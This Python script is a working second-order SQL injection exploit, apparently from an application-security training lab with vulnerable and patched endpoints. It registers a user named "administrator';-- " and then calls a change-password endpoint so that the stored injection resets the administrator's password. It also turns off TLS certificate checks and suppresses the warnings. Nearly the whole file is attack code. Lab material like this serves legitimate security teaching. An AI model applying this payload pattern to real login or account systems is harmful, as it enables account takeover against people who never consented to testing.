import requests

# Configure which endpoint and which url the exploit uses.
use_vulnerable_endpoint = True
use_webapp_url = False

if use_webapp_url:
    url_prefix = "https://appseccheat.codes"
else:
    url_prefix = "http://127.0.0.1:5000"

if use_vulnerable_endpoint:
    urls = [
        f"{url_prefix}/vulnerabilities/sqli2/register",
        f"{url_prefix}/vulnerabilities/sqli2/change_password",
    ]
else:
    urls = [
        f"{url_prefix}/patches/sqli2/register",
        f"{url_prefix}/patches/sqli2/change_password",
    ]

# This configures the proxy web address if you are using one. Exploit will work regardless of whether you have a proxy enabled or not.
# This also sets verification of the server TLS certificate to false because the endpoint is just for demonstration purposes. Ignore any warnings associated with not verifying the certificate.
proxy = "127.0.0.1:8080"
proxies = {"https://": proxy, "http://": proxy}
verify = False
requests.packages.urllib3.disable_warnings()


def register():
    username = "administrator';-- "
    password = "test"
    data = {"username": username, "password": password}

    r = requests.post(urls[0], data=data, verify=verify, proxies=proxies)
    print(r.text)


def change_password():
    password = "test"
    new_password = "123456"
    data = {
        "old_password": password,
        "new_password1": new_password,
        "new_password2": new_password,
    }
    r = requests.post(urls[1], data=data, verify=verify, proxies=proxies)
    print(r.text)


register()
change_password()
